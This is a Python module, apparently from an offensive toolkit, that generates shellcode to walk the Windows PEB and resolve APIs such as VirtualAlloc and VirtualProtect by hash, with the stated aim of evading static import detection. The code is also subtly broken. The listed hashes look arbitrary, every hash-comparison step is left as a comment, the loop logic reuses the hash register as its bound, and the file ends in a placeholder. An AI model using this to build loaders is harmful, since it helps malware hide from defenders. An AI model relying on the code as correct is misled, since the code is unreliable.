"""
API Resolver Generator Module
===========================

This module provides functionality for generating shellcode that dynamically resolves
Windows API functions at runtime, making imports harder to detect statically.

The generated resolver uses PEB walking techniques to find and load required DLLs
and locate API functions by hash, avoiding direct imports and string references.
"""

import struct
from typing import Optional, Dict, List, Tuple
from loguru import logger
from keystone import (
    Ks, KS_ARCH_X86, KS_MODE_32, KS_MODE_64,
    KsError, KS_OPT_SYNTAX_INTEL
)

class ResolverGenerationError(Exception):
    """Exception raised for errors during resolver generation."""
    def __init__(self, message: str, details: Dict = None):
        self.details = details or {}
        super().__init__(message)

class ImportObfuscation:
    """Handles generation of API resolver shellcode."""
    
    # API hashing algorithm constants
    HASH_MULTIPLIER = 0x1003F
    HASH_CONSTANT = 0x1505
    
    # Common Windows APIs and their hashes
    API_HASHES = {
        'kernel32.dll': {
            'LoadLibraryA': 0x0B8B7F5,
            'GetProcAddress': 0x1B3A87D,
            'VirtualAlloc': 0x3F9287A,
            'VirtualProtect': 0x5F2D5BA
        },
        'ntdll.dll': {
            'NtFlushInstructionCache': 0x7C93A5B,
            'RtlAddFunctionTable': 0x9D2A89C
        }
    }
    
    @staticmethod
    def _calculate_hash(name: str) -> int:
        """
        Calculate hash for API name using custom algorithm.
        
        Args:
            name: Function or DLL name
            
        Returns:
            int: Calculated hash value
        """
        hash_value = ImportObfuscation.HASH_CONSTANT
        
        for char in name.lower():
            hash_value = ((hash_value * ImportObfuscation.HASH_MULTIPLIER) & 0xFFFFFFFF) + ord(char)
            hash_value = hash_value & 0xFFFFFFFF
        
        return hash_value

    @classmethod
    def generate_api_resolver(cls, is_64bit: bool = False) -> Optional[bytes]:
        """
        Generate position-independent API resolver shellcode.
        
        Args:
            is_64bit: Whether to generate 64-bit shellcode (default: False)
            
        Returns:
            Optional[bytes]: Generated shellcode or None if failed
            
        Raises:
            ResolverGenerationError: If shellcode generation fails
        """
        try:
            # Initialize Keystone assembler
            arch = KS_ARCH_X86
            mode = KS_MODE_64 if is_64bit else KS_MODE_32
            
            try:
                ks = Ks(arch, mode)
                ks.syntax = KS_OPT_SYNTAX_INTEL
            except KsError as e:
                logger.error(f"[red]Failed to initialize Keystone assembler:[/red] {str(e)}")
                raise ResolverGenerationError(
                    "Keystone initialization failed",
                    {"error": str(e)}
                )
            
            # Generate shellcode components
            logger.debug("[cyan]Generating API resolver components...[/cyan]")
            
            components = []
            
            # 1. PEB access code
            peb_code = cls._generate_peb_access(is_64bit)
            components.append(("PEB Access", peb_code))
            
            # 2. DLL hash lookup
            dll_code = cls._generate_dll_lookup(is_64bit)
            components.append(("DLL Lookup", dll_code))
            
            # 3. Export directory parsing
            export_code = cls._generate_export_parser(is_64bit)
            components.append(("Export Parser", export_code))
            
            # 4. API hash lookup
            api_code = cls._generate_api_lookup(is_64bit)
            components.append(("API Lookup", api_code))
            
            # 5. Function table setup (64-bit only)
            if is_64bit:
                table_code = cls._generate_function_table(is_64bit)
                components.append(("Function Table", table_code))
            
            # Combine and assemble components
            full_code = []
            total_size = 0
            
            for name, code in components:
                try:
                    encoding, count = ks.asm(code)
                    if not encoding:
                        raise ResolverGenerationError(
                            f"Failed to assemble {name} component",
                            {"component": name, "code": code}
                        )
                    
                    shellcode = bytes(encoding)
                    full_code.append(shellcode)
                    total_size += len(shellcode)
                    
                    logger.debug(
                        f"[green]✓[/green] Assembled {name}:\n"
                        f"  Size: {len(shellcode):,} bytes\n"
                        f"  Instructions: {count:,}"
                    )
                    
                except KsError as e:
                    logger.error(f"[red]Assembly error in {name}:[/red] {str(e)}")
                    raise ResolverGenerationError(
                        f"Failed to assemble {name}",
                        {"error": str(e), "component": name}
                    )
            
            # Combine all components
            final_shellcode = b''.join(full_code)
            
            # Verify shellcode characteristics
            if len(final_shellcode) > 4096:  # Arbitrary size limit
                logger.warning(
                    f"[yellow]Generated shellcode is larger than expected:[/yellow]\n"
                    f"  Size: {len(final_shellcode):,} bytes\n"
                    "  Consider optimizing the code"
                )
            
            if b'\x00' in final_shellcode:
                logger.warning("[yellow]Shellcode contains null bytes[/yellow]")
            
            logger.success(
                "[green]Successfully generated API resolver:[/green]\n"
                f"  Architecture: {'x64' if is_64bit else 'x86'}\n"
                f"  Total Size: {len(final_shellcode):,} bytes\n"
                f"  Components: {len(components)}"
            )
            
            return final_shellcode
            
        except ResolverGenerationError:
            # Re-raise with original context
            raise
            
        except Exception as e:
            logger.error(f"[red]Unexpected error generating resolver:[/red] {str(e)}")
            logger.exception("Generation error details:")
            raise ResolverGenerationError(
                "Unexpected error during generation",
                {"error": str(e)}
            )

    @classmethod
    def _generate_peb_access(cls, is_64bit: bool) -> str:
        """Generate assembly for PEB access."""
        if is_64bit:
            return """
                push rax                    ; Save registers
                push rcx
                push rdx
                push r8
                push r9
                push r10
                push r11
                
                mov rax, gs:[0x60]         ; Get PEB
                mov rax, [rax + 0x18]      ; Get PEB_LDR_DATA
                mov rax, [rax + 0x20]      ; Get InMemoryOrderModuleList
            """
        else:
            return """
                push eax                    ; Save registers
                push ecx
                push edx
                
                mov eax, fs:[0x30]         ; Get PEB
                mov eax, [eax + 0x0C]      ; Get PEB_LDR_DATA
                mov eax, [eax + 0x14]      ; Get InMemoryOrderModuleList
            """

    @classmethod
    def _generate_dll_lookup(cls, is_64bit: bool) -> str:
        """Generate assembly for DLL lookup by hash."""
        if is_64bit:
            return """
                xor rcx, rcx               ; Clear hash accumulator
                mov rdx, [rax + 0x50]      ; Get module name pointer
                
            dll_hash_loop:
                movzx r8, byte [rdx]       ; Get next character
                test r8, r8                ; Check for null terminator
                jz dll_hash_done
                
                imul rcx, 0x1003F          ; Hash algorithm
                add rcx, r8
                inc rdx
                jmp dll_hash_loop
                
            dll_hash_done:
                ; Compare hash (rcx) with target
            """
        else:
            return """
                xor ecx, ecx               ; Clear hash accumulator
                mov edx, [eax + 0x28]      ; Get module name pointer
                
            dll_hash_loop:
                movzx ebx, byte [edx]      ; Get next character
                test ebx, ebx              ; Check for null terminator
                jz dll_hash_done
                
                imul ecx, 0x1003F          ; Hash algorithm
                add ecx, ebx
                inc edx
                jmp dll_hash_loop
                
            dll_hash_done:
                ; Compare hash (ecx) with target
            """

    @classmethod
    def _generate_export_parser(cls, is_64bit: bool) -> str:
        """Generate assembly for parsing export directory."""
        if is_64bit:
            return """
                mov rax, [rax + 0x30]      ; Get DLL base address
                mov edx, [rax + 0x3C]      ; Get PE header offset
                add rdx, rax
                mov edx, [rdx + 0x88]      ; Get export directory RVA
                add rdx, rax               ; Get export directory VA
                
                mov ecx, [rdx + 0x18]      ; Get number of names
                mov r8d, [rdx + 0x20]      ; Get names array RVA
                add r8, rax                ; Get names array VA
            """
        else:
            return """
                mov eax, [eax + 0x10]      ; Get DLL base address
                mov edx, [eax + 0x3C]      ; Get PE header offset
                add edx, eax
                mov edx, [edx + 0x78]      ; Get export directory RVA
                add edx, eax               ; Get export directory VA
                
                mov ecx, [edx + 0x18]      ; Get number of names
                mov ebx, [edx + 0x20]      ; Get names array RVA
                add ebx, eax               ; Get names array VA
            """

    @classmethod
    def _generate_api_lookup(cls, is_64bit: bool) -> str:
        """Generate assembly for API function lookup by hash."""
        if is_64bit:
            return """
                xor r9, r9                 ; Initialize counter
                
            find_function_loop:
                mov rdx, [r8 + r9*8]       ; Get function name RVA
                add rdx, rax               ; Get function name VA
                
                push rcx
                push r8
                push r9
                
                ; Calculate hash of function name
                xor rcx, rcx               ; Clear hash accumulator
                
            api_hash_loop:
                movzx r8, byte [rdx]       ; Get next character
                test r8, r8
                jz api_hash_done
                
                imul rcx, 0x1003F
                add rcx, r8
                inc rdx
                jmp api_hash_loop
                
            api_hash_done:
                ; Compare hash (rcx) with target
                pop r9
                pop r8
                pop rcx
                
                inc r9
                cmp r9, rcx
                jb find_function_loop
            """
        else:
            return """
                xor edi, edi               ; Initialize counter
                
            find_function_loop:
                mov edx, [ebx + edi*4]     ; Get function name RVA
                add edx, eax               ; Get function name VA
                
                push ecx
                push ebx
                push edi
                
                ; Calculate hash of function name
                xor ecx, ecx               ; Clear hash accumulator
                
            api_hash_loop:
                movzx ebx, byte [edx]      ; Get next character
                test ebx, ebx
                jz api_hash_done
                
                imul ecx, 0x1003F
                add ecx, ebx
                inc edx
                jmp api_hash_loop
                
            api_hash_done:
                ; Compare hash (ecx) with target
                pop edi
                pop ebx
                pop ecx
                
                inc edi
                cmp edi, ecx
                jb find_function_loop
            """

    @classmethod
    def _generate_function_table(cls, is_64bit: bool) -> str:
        """Generate assembly for setting up function table (64-bit only)."""
        if not is_64bit:
            return ""
            
        return """
            ; Set up exception handling function table
            sub rsp, 40                    ; Allocate shadow space
            mov rcx, rax                   ; Image base
            lea rdx, [rip]                 ; Runtime function array
            mov r8d, 1                     ; Number of entries
            call qword [rip + rtl_offset]  ; Call RtlAddFunctionTable
            add rsp, 40                    ; Restore stack
            
            ; Data section
            rtl_offset: dq 0x9D2A89C       ; RtlAddFunctionTable hash
        """

# ... rest of the class implementation ... 